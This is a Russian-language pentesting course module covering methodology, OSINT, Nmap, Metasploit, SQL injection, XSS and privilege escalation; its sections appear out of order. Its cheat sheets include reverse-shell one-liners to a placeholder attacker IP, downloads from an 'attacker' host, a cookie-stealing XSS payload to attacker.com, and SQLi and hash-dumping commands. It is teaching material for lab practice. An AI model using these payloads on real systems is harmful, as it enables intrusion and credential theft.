# 🔍 БЛОК 3: АНАЛИЗ УЯЗВИМОСТЕЙ И ТЕСТИРОВАНИЕ НА ПРОНИКНОВЕНИЕ

```
════════════════════════════════════════════════════════════════════════════════
                    ПРОДОЛЖИТЕЛЬНОСТЬ: 4-5 МЕСЯЦЕВ
                    УРОВЕНЬ СЛОЖНОСТИ: ★★★★☆
                    ПРАКТИКА/ТЕОРИЯ: 70%/30%
════════════════════════════════════════════════════════════════════════════════
```

## 🎯 ЦЕЛЬ БЛОКА

> **Научиться выявлять, анализировать и эксплуатировать уязвимости информационных систем**

По завершении блока вы сможете:
- ✅ Проводить комплексное тестирование на проникновение
- ✅ Анализировать защищенность систем
- ✅ Документировать и устранять найденные уязвимости
- ✅ Работать с современными инструментами пентестинга

---

## 📋 СТРУКТУРА БЛОКА

```
┌─────────────────────────────────────────────────────────────────┐
│  ГЛАВА 3.1  │  ГЛАВА 3.2  │  ГЛАВА 3.3  │  ГЛАВА 3.4  │  3.5   │
│  Методология│  Разведка   │ Эксплуатация│  Анализ кода│ Спец.  │
│  (3 недели) │ (4 недели)  │ (5 недель)  │ (3 недели)  │техники │
│             │             │             │             │(3-4 нед)│
└─────────────────────────────────────────────────────────────────┘

## 🚀 Переход к следующему блоку

### 📝 Чек-лист готовности к Блоку 4

Перед переходом к "Управлению инцидентами и реагированию" убедитесь, что вы:

```
☐ Можете самостоятельно провести полный пентест веб-приложения
☐ Умеете работать с Metasploit и создавать эксплоиты
☐ Владеете техниками OSINT и разведки
☐ Понимаете принципы анализа кода на уязвимости
☐ Знакомы со специализированными областями (IoT, Cloud, AD)
☐ Можете документировать результаты пентеста
☐ Прошли практические задания с реальными уязвимостями
```

### 🎯 Рекомендации для углубления знаний

**Практические платформы:**
- 🏆 **HackTheBox** - Реальные сценарии пентестинга
- 🎮 **TryHackMe** - Обучающие лабы по шагам  
- ⚔️ **VulnHub** - Уязвимые виртуальные машины
- 🐛 **WebGoat/DVWA** - Уязвимые веб-приложения
- 🏅 **PentesterLab** - Специализированные упражнения

**Соревнования:**
- 🏃‍♂️ **CTF Time** - Календарь CTF соревнований
- 💰 **Bug Bounty** - HackerOne, Bugcrowd, Synack
- 🥇 **Национальные CTF** - RuCTF, Positive Hack Days

**Литература для углубления:**
- 📚 "The Web Application Hacker's Handbook" - Stuttard, Pinto
- 📖 "Real-World Bug Hunting" - Peter Yaworski  
- 📘 "The Hacker Playbook" - Peter Kim
- 📗 "Penetration Testing" - Georgia Weidman

---

# 🔍 ДОПОЛНИТЕЛЬНЫЕ РЕСУРСЫ

## 🛠️ Лабораторные стенды

### Готовые виртуальные машины

| **Название** | **Уровень** | **Специализация** | **Ссылка** |
|--------------|-------------|-------------------|------------|
| **Metasploitable 2/3** | Beginner | Linux pentesting | sourceforge.net |
| **VulnHub VMs** | All levels | Various scenarios | vulnhub.com |
| **HackTheBox Retired** | Intermediate+ | Real-world pentesting | hackthebox.eu |
| **DVWA** | Beginner | Web application | dvwa.co.uk |
| **bWAPP** | Intermediate | Web vulnerabilities | itsecgames.com |
| **WebGoat** | Beginner | OWASP Top 10 | owasp.org |

### Создание собственной лаборатории

```
┌─────────────────────────────────────────────────────────────────┐
│                    HOME LAB SETUP                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  🖥️ HYPERVISOR                                                  │
│  ──────────────                                                 │
│  • VMware Workstation/Player                                   │
│  • VirtualBox (Free)                                           │
│  • Proxmox (Free, Enterprise)                                  │
│  • ESXi (Free license)                                         │
│                                                                 │
│  🎯 ATTACK MACHINES           🛡️ TARGET MACHINES                │
│  ─────────────────            ──────────────────                │
│  • Kali Linux                 • Windows 7/10                   │
│  • Parrot Security            • Windows Server 2016/2019       │
│  • BlackArch                  • Ubuntu/CentOS                  │
│  • Pentoo                     • Metasploitable                 │
│                               • DVWA                           │
│                                                                 │
│  🌐 NETWORK SIMULATION                                          │
│  ──────────────────                                             │
│  • pfSense firewall                                            │
│  • GNS3 for network topology                                   │
│  • Docker containers                                           │
│  • Isolated network segments                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 📚 Документация и шпаргалки

### Команды для быстрого справочника

```bash
# ═══════════════════════════════════════════════════════════════
#                    PENETRATION TESTING CHEATSHEET  
# ═══════════════════════════════════════════════════════════════

# ─── RECONNAISSANCE ───
nmap -sS -sV -O target.com                    # TCP SYN + versions + OS
nmap -sU --top-ports 100 target.com           # UDP top ports
masscan -p1-65535 target.com --rate=1000      # Fast port scan

# ─── WEB APPLICATION TESTING ───
dirb http://target.com                         # Directory brute force
nikto -h http://target.com                     # Web vulnerability scan
sqlmap -u "http://site.com/page.php?id=1"     # SQL injection testing

# ─── EXPLOITATION ───
msfconsole                                     # Start Metasploit
search ms17-010                                # Search for exploits  
use exploit/windows/smb/ms17_010_eternalblue   # Use specific exploit

# ─── POST-EXPLOITATION ───
getuid                                         # Current user (Meterpreter)
getsystem                                      # Escalate privileges
hashdump                                       # Dump password hashes
download file.txt                              # Download file

# ─── PRIVILEGE ESCALATION (Linux) ───
find / -perm -4000 2>/dev/null                # Find SUID files
sudo -l                                        # Check sudo permissions
cat /etc/passwd                                # List users
ps aux                                         # Running processes

# ─── PRIVILEGE ESCALATION (Windows) ───
whoami /priv                                   # Current privileges
net users                                      # List users
systeminfo                                     # System information
wmic service list brief                        # List services
```

### Полезные одноразовые команды

```bash
# Reverse shell payloads
bash -i >& /dev/tcp/attacker_ip/4444 0>&1                    # Bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  # Python
nc -e /bin/sh attacker_ip 4444                               # Netcat

# File transfer methods
python3 -m http.server 8000                                  # Simple HTTP server
scp file.txt user@target:/tmp/                               # SCP transfer  
curl http://attacker/file.txt -o file.txt                    # Download with curl
wget http://attacker/file.txt                                # Download with wget

# Encoding/Decoding
echo "data" | base64                                          # Base64 encode
echo "ZGF0YQ==" | base64 -d                                  # Base64 decode
echo "data" | xxd                                             # Hex dump
```

## 🔗 Полезные ссылки и ресурсы

### 📖 Онлайн документация

```
┌─────────────────────────────────────────────────────────────────┐
│                      ESSENTIAL REFERENCES                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│ 🌐 OWASP                     📚 NIST                            │
│ • Top 10 Web Risks          • Cybersecurity Framework          │
│ • Testing Guide             • SP 800 series                    │
│ • Code Review Guide         • Risk Management                  │
│ • Mobile Security           • Incident Response                │
│                                                                 │
│ ⚔️ MITRE ATT&CK             🛡️ SANS                            │
│ • Tactics & Techniques      • Reading Room                     │
│ • Threat Intelligence       • Cheat Sheets                     │
│ • Detection Analytics       • Training Materials               │
│                                                                 │
│ 🔍 CVE/CWE DATABASES        📊 THREAT INTELLIGENCE              │
│ • CVE Details               • Threat Crowd                     │
│ • NVD Database              • VirusTotal                       │
│ • Exploit-DB                • Hybrid Analysis                  │
│ • SecurityFocus             • Any.run                          │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 🎓 Обучающие платформы

| **Платформа** | **Тип** | **Специализация** | **Стоимость** |
|---------------|---------|-------------------|---------------|
| **Cybrary** | Курсы | Общая кибербезопасность | Freemium |
| **PentesterAcademy** | Лабы | Пентестинг | Платная |
| **eLearnSecurity** | Курсы | Этичный хакинг | Платная |
| **InfoSec Institute** | Курсы | Сертификации | Платная |
| **StationX** | Курсы | Практические навыки | Платная |
| **SANS Community** | Бесплатные ресурсы | Исследования | Бесплатная |

### 📱 Мобильные приложения

```
🔐 Security Apps:
├─ Kali NetHunter (Android root required)
├─ Network Analyzer (iOS/Android)  
├─ WiFi Analyzer (Android)
├─ Shodan (iOS/Android)
└─ Metasploit Unleashed (Reference)

📚 Learning Apps:
├─ Security+ by MindVault
├─ CISSP by Pocket Prep
├─ CEH by Pocket Prep  
└─ CompTIA by MeasureUp
```

## 🎯 Следующие шаги

### 📅 Рекомендуемый график изучения

```
┌─────────────────────────────────────────────────────────────────┐
│                    LEARNING TIMELINE                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  НЕДЕЛЯ 1-2: Теоретическая подготовка                          │
│  ├─ Изучение методологий                                       │
│  ├─ Правовые аспекты                                           │
│  └─ Настройка лабораторной среды                               │
│                                                                 │
│  НЕДЕЛЯ 3-6: Базовые навыки                                    │
│  ├─ OSINT и разведка                                           │
│  ├─ Сканирование и перечисление                                │
│  └─ Первые эксплоиты на Metasploitable                         │
│                                                                 │
│  НЕДЕЛЯ 7-12: Продвинутые техники                              │
│  ├─ Веб-приложения (DVWA, WebGoat)                             │
│  ├─ Анализ кода и reverse engineering                          │
│  └─ Специализированные области                                 │
│                                                                 │
│  НЕДЕЛЯ 13-16: Практика и проекты                              │
│  ├─ CTF соревнования                                           │
│  ├─ Bug bounty hunting                                         │
│  └─ Реальные проекты                                           │
│                                                                 │
│  НЕДЕЛЯ 17-20: Подготовка к сертификации                       │
│  ├─ Выбор и подготовка к экзамену                              │
│  ├─ Практические экзамены                                      │
│  └─ Получение сертификата                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 🎓 План развития карьеры

**Короткосрочные цели (3-6 месяцев):**
- ✅ Завершить блок 3 с практическими заданиями
- 🎯 Получить первую сертификацию (CEH/Security+)
- 💼 Начать работу junior pentester или security analyst
- 🏆 Участвовать в CTF соревнованиях

**Среднесрочные цели (6-12 месяцев):**
- 🥇 Получить OSCP или аналогичную практическую сертификацию
- 💰 Попробовать bug bounty hunting
- 👥 Присоединиться к security сообществам
- 📈 Развивать специализацию (web/mobile/cloud)

**Долгосрочные цели (1-2 года):**
- 🏢 Продвинуться до middle/senior позиции
- 🎤 Выступать на конференциях
- 📝 Публиковать исследования
- 👨‍🏫 Менторить newcomers в области ИБ

---

**🎉 Поздравляем! Вы завершили один из самых практических и важных блоков программы обучения информационной безопасности.**

Полученные в этом блоке навыки являются основой для работы в offensive security и станут фундаментом для изучения defensive security в следующих блоках программы.
```

---

# 📚 ГЛАВА 3.1: МЕТОДОЛОГИЯ ТЕСТИРОВАНИЯ НА ПРОНИКНОВЕНИЕ

**⏱️ Продолжительность:** 3 недели  
**🎯 Цель:** Освоить стандарты и методологии этичного хакинга

## 🔧 Стандарты и методологии

### PTES (Penetration Testing Execution Standard)

```
┌─────────────────────────────────────────────────────────────────┐
│                      ФАЗЫ PTES                                  │
├─────────────────────────────────────────────────────────────────┤
│  1. Pre-engagement    →  2. Intelligence     →  3. Threat       │
│     Interactions          Gathering              Modeling       │
│                                                                 │
│  4. Vulnerability     →  5. Exploitation     →  6. Post         │
│     Analysis                                     Exploitation   │
│                                                                 │
│  7. Reporting         ←──────────────────────────────────────── │
└─────────────────────────────────────────────────────────────────┘
```

### OWASP Testing Guide

| **Категория** | **Основные тесты** | **Инструменты** |
|---------------|-------------------|-----------------|
| 🔍 Information Gathering | • Fingerprinting<br>• Directory discovery<br>• Architecture analysis | • Nmap<br>• Dirb/Dirbuster<br>• Whatweb |
| 🔐 Authentication Testing | • Credential attacks<br>• Session management<br>• Multi-factor bypass | • Hydra<br>• Burp Suite<br>• Custom scripts |
| 🛡️ Authorization Testing | • Path traversal<br>• Privilege escalation<br>• Access controls | • Manual testing<br>• Burp Suite<br>• Custom tools |
| 💾 Data Validation | • SQL injection<br>• XSS<br>• Input validation | • SQLmap<br>• XSSer<br>• Burp Suite |

## ⚖️ Правовые аспекты этичного хакинга

```
────────────────────────────────────────────────────────────────────
                         LEGAL FRAMEWORK
────────────────────────────────────────────────────────────────────

🟢 РАЗРЕШЕНО                    🔴 ЗАПРЕЩЕНО
─────────────                   ─────────────
✓ Тестирование с письменным     ✗ Неавторизованный доступ
  разрешением                   ✗ Нарушение SLA клиента
✓ Следование scope документа    ✗ Атаки на сторонние системы
✓ Уведомление о критических     ✗ Социальная инженерия без
  уязвимостях                     согласования
✓ Конфиденциальность данных     ✗ Модификация данных клиента

────────────────────────────────────────────────────────────────────
```

### Документы для пентеста

1. **📄 Statement of Work (SOW)**
   - Scope тестирования
   - Временные рамки
   - Методологии
   - Ограничения

2. **📋 Rules of Engagement**
   - Разрешенные техники
   - Контактная информация
   - Процедуры эскалации
   - Часы тестирования

3. **🔒 Non-Disclosure Agreement (NDA)**
   - Конфиденциальность
   - Обработка данных
   - Сроки действия

## 📊 Структура отчета по пентесту

```
┌─────────────────────────────────────────────────────────────────┐
│                    СТРУКТУРА ОТЧЕТА                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  📋 EXECUTIVE SUMMARY                                           │
│  ├─ Общие выводы                                               │
│  ├─ Критические находки                                        │
│  └─ Рекомендации для руководства                               │
│                                                                 │
│  🔍 TECHNICAL FINDINGS                                          │
│  ├─ Детальные уязвимости                                       │
│  ├─ Доказательства (PoC)                                       │
│  ├─ Риск-рейтинги                                              │
│  └─ Шаги воспроизведения                                       │
│                                                                 │
│  🛠️ RECOMMENDATIONS                                             │
│  ├─ Краткосрочные меры                                         │
│  ├─ Долгосрочная стратегия                                     │
│  └─ Приоритизация исправлений                                  │
│                                                                 │
│  📎 APPENDICES                                                  │
│  ├─ Методология                                                │
│  ├─ Инструменты                                                │
│  └─ Дополнительные материалы                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 🎯 Практические задания

### 📝 Задание 1: Планирование пентеста

**Сценарий:** Вам поручили провести пентест веб-приложения банка

**Задачи:**
1. Создать Statement of Work
2. Определить Rules of Engagement
3. Выбрать методологию тестирования
4. Составить timeline проекта

### 📊 Задание 2: Составление отчета

**Входные данные:** Найденные уязвимости
- SQL Injection (Critical)
- XSS (Medium)
- Information Disclosure (Low)

**Задачи:**
1. Написать Executive Summary
2. Описать технические детали
3. Предложить рекомендации
4. Создать план remediation

---

# 🕵️ ГЛАВА 3.2: РАЗВЕДКА И СКАНИРОВАНИЕ

**⏱️ Продолжительность:** 4 недели  
**🎯 Цель:** Освоить техники сбора информации о целевых системах

## 🔍 OSINT (Open Source Intelligence)

### Модель разведки

```
┌─────────────────────────────────────────────────────────────────┐
│                    OSINT PYRAMID                                │
│                                                                 │
│                     ╭─────────╮                                 │
│                     │ ЛЮДСКИЕ │                                 │
│                     │ РЕСУРСЫ │                                 │
│                     ╰─────────╯                                 │
│                   ╭───────────────╮                             │
│                   │  ТЕХНИЧЕСКИЕ  │                             │
│                   │   РЕСУРСЫ     │                             │
│                   ╰───────────────╯                             │
│               ╭─────────────────────────╮                       │
│               │     ОРГАНИЗАЦИОННАЯ     │                       │
│               │      ИНФОРМАЦИЯ         │                       │
│               ╰─────────────────────────╯                       │
│           ╭─────────────────────────────────╮                   │
│           │       ПУБЛИЧНАЯ ИНФРА-          │                   │
│           │       СТРУКТУРА И ДОМЕНЫ        │                   │
│           ╰─────────────────────────────────╯                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Инструменты OSINT

| **Категория** | **Инструмент** | **Назначение** | **Пример использования** |
|---------------|----------------|----------------|--------------------------|
| 🌐 **Домены** | theHarvester | Email/субдомены | `theharvester -d target.com -l 100 -b google` |
| 🌐 **Домены** | Sublist3r | Поиск субдоменов | `sublist3r -d target.com -v` |
| 👥 **Социальные сети** | Sherlock | Поиск аккаунтов | `sherlock username` |
| 📧 **Email** | Hunter.io | Поиск email-ов | Web-интерфейс |
| 🗂️ **Метаданные** | FOCA | Анализ документов | GUI приложение |
| 📊 **Общий анализ** | Maltego | Визуализация связей | GUI приложение |

### Пример OSINT-расследования

```
Target: example-corp.com

┌─── STEP 1: DNS ENUMERATION ───┐
│                               │
│ $ dig example-corp.com        │
│ $ fierce -dns example-corp.com│
│ $ dnsrecon -d example-corp.com│
│                               │
└───────────────────────────────┘
            │
            ▼
┌─── STEP 2: SUBDOMAIN DISCOVERY ───┐
│                                   │
│ Найденные субдомены:              │
│ • mail.example-corp.com           │
│ • dev.example-corp.com            │
│ • api.example-corp.com            │
│ • staging.example-corp.com        │
│                                   │
└───────────────────────────────────┘
            │
            ▼
┌─── STEP 3: TECHNOLOGY DETECTION ───┐
│                                     │
│ $ whatweb example-corp.com          │
│ $ wappalyzer example-corp.com       │
│                                     │
│ Результат:                          │
│ • Apache 2.4.41                    │
│ • PHP 7.4                          │
│ • WordPress 5.8                    │
│                                     │
└─────────────────────────────────────┘
```

## 🔍 Сканирование портов с Nmap

### Основные техники сканирования

```
────────────────────────────────────────────────────────────────────
                        NMAP SCAN TYPES
────────────────────────────────────────────────────────────────────

🔹 TCP SYN SCAN (-sS)
   ┌─────┐    SYN     ┌─────┐
   │Host │ ────────►  │Port │  Быстрое сканирование
   └─────┘  ◄──────── └─────┘  Стелс режим
            SYN/ACK

🔹 TCP CONNECT SCAN (-sT)  
   ┌─────┐  Full TCP  ┌─────┐
   │Host │ ◄────────► │Port │  Полное подключение
   └─────┘ Connection └─────┘  Медленнее, но надежнее

🔹 UDP SCAN (-sU)
   ┌─────┐     UDP    ┌─────┐
   │Host │ ────────►  │Port │  Сканирование UDP
   └─────┘  Response  └─────┘  Медленное, но важное

────────────────────────────────────────────────────────────────────
```

### Продвинутые техники Nmap

| **Техника** | **Команда** | **Описание** |
|-------------|-------------|--------------|
| 🚀 **Быстрое сканирование** | `nmap -T4 -F target` | Сканирование топ-100 портов |
| 🔍 **Детальное сканирование** | `nmap -sV -sC -O target` | Версии + скрипты + ОС |
| 👻 **Стелс сканирование** | `nmap -sS -T2 target` | Медленное незаметное |
| 🛡️ **Обход файрволов** | `nmap -f -D RND:10 target` | Фрагментация + ложные IP |
| 📊 **Массовое сканирование** | `nmap -sn 192.168.1.0/24` | Обнаружение хостов |

### NSE (Nmap Scripting Engine)

```
┌─────────────────────────────────────────────────────────────────┐
│                    ПОЛЕЗНЫЕ NSE СКРИПТЫ                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│ 🔐 УЯЗВИМОСТИ                                                   │
│ ──────────────                                                  │
│ nmap --script vuln target                                       │
│ nmap --script smb-vuln-* target                                 │
│ nmap --script http-vuln-* target                                │
│                                                                 │
│ 🕸️ WEB ПРИЛОЖЕНИЯ                                               │
│ ─────────────────                                               │
│ nmap --script http-enum target                                  │
│ nmap --script http-sql-injection target                         │
│ nmap --script http-xssed target                                 │
│                                                                 │
│ 🗂️ БАЗЫ ДАННЫХ                                                  │
│ ──────────────                                                  │
│ nmap --script mysql-* target                                    │
│ nmap --script ms-sql-* target                                   │
│ nmap --script oracle-* target                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 🔍 Анализ веб-приложений

### Инструменты для веб-анализа

```
┌─────────────────────────────────────────────────────────────────┐
│                    WEB ANALYSIS TOOLS                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  DIRB/DIRBUSTER              NIKTO                              │
│  ┌─────────────────┐         ┌─────────────────┐               │
│  │ • Directory     │         │ • Vulnerability │               │
│  │   discovery     │   ◄─────┤   scanning      │               │
│  │ • File brute    │         │ • Config issues │               │
│  │ • Custom lists  │         │ • Server info   │               │
│  └─────────────────┘         └─────────────────┘               │
│           │                           │                        │
│           ▼                           ▼                        │
│  ┌─────────────────┐         ┌─────────────────┐               │
│  │    GOBUSTER     │         │   WHATWEB       │               │
│  │ • Fast scanning │         │ • Technology    │               │
│  │ • Go-based      │         │   detection     │               │
│  │ • Multi-thread  │         │ • Fingerprint   │               │
│  └─────────────────┘         └─────────────────┘               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Пример web-сканирования

```bash
# 1. Базовое сканирование структуры
dirb http://target.com /usr/share/dirb/wordlists/common.txt

# 2. Поиск файлов с расширениями
gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt

# 3. Анализ уязвимостей
nikto -h http://target.com

# 4. Определение технологий
whatweb http://target.com
```

## 🎯 Практические задания

### 🔍 Задание 1: OSINT-расследование

**Цель:** Собрать максимум информации о целевой организации

**Этапы:**
1. **Домены и субдомены**
   ```bash
   theharvester -d target.com -l 500 -b google,bing,linkedin
   sublist3r -d target.com -v
   ```

2. **Технологии и инфраструктура**
   ```bash
   whatweb target.com
   nmap -sV target.com
   ```

3. **Социальная инженерия**
   - Поиск сотрудников в LinkedIn
   - Анализ социальных сетей
   - Сбор email-адресов

**Результат:** Подробный отчет о цифровом следе организации

### 🔍 Задание 2: Комплексное сканирование сети

**Сценарий:** Сканирование корпоративной сети 192.168.1.0/24

**План сканирования:**
```
Phase 1: Host Discovery
├─ nmap -sn 192.168.1.0/24
└─ Список активных хостов

Phase 2: Port Scanning  
├─ nmap -sS -T4 -p- [discovered_hosts]
└─ Открытые порты на всех хостах

Phase 3: Service Detection
├─ nmap -sV -sC [open_ports]
└─ Версии сервисов и базовые скрипты

Phase 4: Vulnerability Scanning
├─ nmap --script vuln [targets]
└─ Потенциальные уязвимости
```

**Deliverable:** 
- Карта сети с хостами и сервисами
- Список потенциальных точек входа
- Рекомендации по безопасности

---

# 💥 ГЛАВА 3.3: ЭКСПЛУАТАЦИЯ УЯЗВИМОСТЕЙ

**⏱️ Продолжительность:** 5 недель  
**🎯 Цель:** Научиться эксплуатировать найденные уязвимости

## 🛠️ Metasploit Framework

### Архитектура Metasploit

```
┌─────────────────────────────────────────────────────────────────┐
│                   METASPLOIT ARCHITECTURE                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│     ┌─────────────┐    ┌─────────────┐    ┌─────────────┐      │
│     │   PAYLOADS  │    │  EXPLOITS   │    │  AUXILIARIES│      │
│     │             │    │             │    │             │      │
│     │ • Meterpreter│    │ • Remote    │    │ • Scanners  │      │
│     │ • Shells     │    │ • Local     │    │ • Fuzzers   │      │
│     │ • Stagers    │    │ • DoS       │    │ • Sniffers  │      │
│     └─────────────┘    └─────────────┘    └─────────────┘      │
│           │                    │                    │           │
│           └────────────────────┼────────────────────┘           │
│                                │                                │
│                        ┌─────────────┐                         │
│                        │    CORE     │                         │
│                        │  FRAMEWORK  │                         │
│                        │             │                         │
│                        │ • Rex       │                         │
│                        │ • MSF Base  │                         │
│                        │ • Interfaces│                         │
│                        └─────────────┘                         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Основные команды Metasploit

| **Команда** | **Описание** | **Пример** |
|-------------|--------------|-----------|
| `search` | Поиск модулей | `search ms17-010` |
| `use` | Выбор модуля | `use exploit/windows/smb/ms17_010_eternalblue` |
| `set` | Установка параметров | `set RHOSTS 192.168.1.100` |
| `show options` | Показать параметры | `show options` |
| `exploit` | Запуск эксплоита | `exploit` |
| `sessions` | Управление сессиями | `sessions -l` |

### Workflow эксплуатации

```
┌─────────────────────────────────────────────────────────────────┐
│                    EXPLOITATION WORKFLOW                       │
│                                                                 │
│  1. RECONNAISSANCE           2. VULNERABILITY DISCOVERY         │
│  ┌─────────────────┐        ┌─────────────────────────┐        │
│  │ • Nmap scanning │   ──►  │ • Version detection     │        │
│  │ • Service enum  │        │ • Vulnerability search  │        │
│  │ • OS detection  │        │ • CVE research          │        │
│  └─────────────────┘        └─────────────────────────┘        │
│                                         │                       │
│                                         ▼                       │
│  4. POST-EXPLOITATION        3. EXPLOITATION                    │
│  ┌─────────────────┐        ┌─────────────────────────┐        │
│  │ • Privilege esc │   ◄──  │ • Exploit selection     │        │
│  │ • Lateral move  │        │ • Payload generation    │        │
│  │ • Persistence   │        │ • Attack execution      │        │
│  └─────────────────┘        └─────────────────────────┘        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## 🌐 Эксплоиты для веб-приложений

### SQL Injection

```
────────────────────────────────────────────────────────────────────
                          SQL INJECTION TYPES
────────────────────────────────────────────────────────────────────

🔹 UNION-BASED
   Original: SELECT * FROM users WHERE id = '1'
   Payload:  1' UNION SELECT username,password FROM admin--
   
🔹 BOOLEAN-BASED BLIND  
   Original: SELECT * FROM users WHERE id = '1'
   Payload:  1' AND (SELECT COUNT(*) FROM users) > 0--
   
🔹 TIME-BASED BLIND
   Original: SELECT * FROM users WHERE id = '1' 
   Payload:  1'; WAITFOR DELAY '00:00:10'--

🔹 ERROR-BASED
   Original: SELECT * FROM users WHERE id = '1'
   Payload:  1' AND (SELECT * FROM (SELECT COUNT(*),
             CONCAT(version(),FLOOR(RAND(0)*2))x FROM 
             information_schema.tables GROUP BY x)a)--

────────────────────────────────────────────────────────────────────
```

### Автоматизация с SQLmap

```bash
# Базовое тестирование
sqlmap -u "http://target.com/page.php?id=1"

# Извлечение баз данных
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Извлечение таблиц
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Извлечение данных
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# POST-запросы
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Работа с cookies
sqlmap -u "http://target.com/page.php" --cookie="PHPSESSID=abc123"
```

### Cross-Site Scripting (XSS)

```html
<!-- REFLECTED XSS -->
Original URL: http://site.com/search.php?q=test
Payload URL:  http://site.com/search.php?q=<script>alert('XSS')</script>

<!-- STORED XSS -->
Comment field: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

<!-- DOM-based XSS -->
URL fragment: http://site.com/page.html#<script>alert('XSS')</script>

<!-- BYPASS FILTERS -->
<svg onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

## 🔼 Privilege Escalation

### Linux Privilege Escalation

```
┌─────────────────────────────────────────────────────────────────┐
│                  LINUX PRIVESC CHECKLIST                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│ 🔍 SYSTEM INFORMATION                                           │
│ ─────────────────────                                           │
│ uname -a                    # Kernel version                    │
│ cat /etc/issue              # OS version                        │
│ cat /etc/passwd             # Users                             │
│ cat /etc/group              # Groups                            │
│                                                                 │
│ 🔑 PERMISSIONS & SUDO                                           │
│ ────────────────────                                            │
│ sudo -l                     # Sudo permissions                  │
│ find / -perm -4000 2>/dev/null  # SUID files                   │
│ find / -perm -2000 2>/dev/null  # SGID files                   │
│ find / -writable 2>/dev/null    # Writable files               │
│                                                                 │
│ 🌐 NETWORK & SERVICES                                           │
│ ────────────────────                                            │
│ netstat -antup              # Network connections              │
│ ps aux                      # Running processes                │
│ crontab -l                  # Cron jobs                        │
│ cat /etc/crontab            # System cron                      │
│                                                                 │
│ 📁 INTERESTING FILES                                            │
│ ───────────────                                                 │
│ find / -name "*.conf" 2>/dev/null  # Config files              │
│ find / -name "*.log" 2>/dev/null   # Log files                 │
│ find /home -name ".*" 2>/dev/null  # Hidden files              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Windows Privilege Escalation

```cmd
REM SYSTEM INFORMATION
systeminfo
whoami /all
net users
net localgroup administrators

REM SERVICES AND PROCESSES  
sc query
tasklist /svc
wmic service list brief

REM REGISTRY CHECKS
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\
reg query HKLM\SYSTEM\CurrentControlSet\Services\

REM FILE PERMISSIONS
icacls "C:\Program Files"
accesschk.exe -uwcqv "Authenticated Users" *
```

## 🔧 Автоматизированные инструменты

### Инструменты для автоматизации

| **Платформа** | **Инструмент** | **Назначение** | **Команда** |
|---------------|----------------|----------------|-------------|
| 🐧 **Linux** | LinEnum | Системное перечисление | `./LinEnum.sh` |
| 🐧 **Linux** | LinPEAS | Автоматический поиск | `./linpeas.sh` |
| 🪟 **Windows** | WinPEAS | Автоматический поиск | `winpeas.exe` |
| 🪟 **Windows** | PowerUp | PowerShell PrivEsc | `Invoke-AllChecks` |
| 🌐 **Web** | Burp Suite | Веб-тестирование | GUI |
| 🌐 **Web** | OWASP ZAP | Автоматическое сканирование | GUI |

## 🎯 Практические задания

### 💻 Задание 1: Практика на Metasploitable

**Цель:** Полная компрометация Metasploitable VM

**Этапы:**
1. **Разведка**
   ```bash
   nmap -sV -sC 192.168.1.100
   ```

2. **Эксплуатация различных сервисов**
   - FTP (vsftpd 2.3.4)
   - SSH (OpenSSH)
   - HTTP (Apache)
   - SMB (Samba)

3. **Post-exploitation**
   - Сбор учетных данных
   - Lateral movement
   - Persistence

**Результат:** Отчет с PoC для каждой найденной уязвимости

### 🌐 Задание 2: Web Application Pentesting

**Цель:** Тестирование DVWA (Damn Vulnerable Web Application)

**Категории уязвимостей:**
- SQL Injection
- XSS (Reflected, Stored, DOM)
- CSRF
- File Upload
- Command Injection

**Уровни сложности:**
- Low → Medium → High → Impossible

**Deliverable:** Подробный отчет с exploit-ами для каждого уровня

---

# 🔍 ГЛАВА 3.4: АНАЛИЗ КОДА И СТАТИЧЕСКОЕ ТЕСТИРОВАНИЕ

**⏱️ Продолжительность:** 3 недели  
**🎯 Цель:** Освоить методы анализа исходного кода на уязвимости

## 🔍 Статический анализ кода (SAST)

### Принципы статического анализа

```
┌─────────────────────────────────────────────────────────────────┐
│                   SAST vs DAST vs IAST                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│ 📊 STATIC (SAST)          📈 DYNAMIC (DAST)         🔄 IAST     │
│ ─────────────────         ──────────────────        ──────      │
│                                                                 │
│ ✅ Анализ кода            ✅ Реальные условия        ✅ Гибрид  │
│ ✅ Раннее обнаружение     ✅ Тестирование API        ✅ Точность │
│ ✅ 100% покрытие          ✅ Конфигурация             ✅ Runtime │
│                                                                 │
│ ❌ False positives        ❌ Неполное покрытие        ❌ Сложнее │
│ ❌ Контекст              ❌ Позднее обнаружение       ❌ Ресурсы │
│                                                                 │
│     ┌─────────┐              ┌─────────┐              ┌───────┐ │
│     │ Исходный│              │Работающее│              │Инструм│ │
│     │   код   │              │приложение│              │ентация│ │
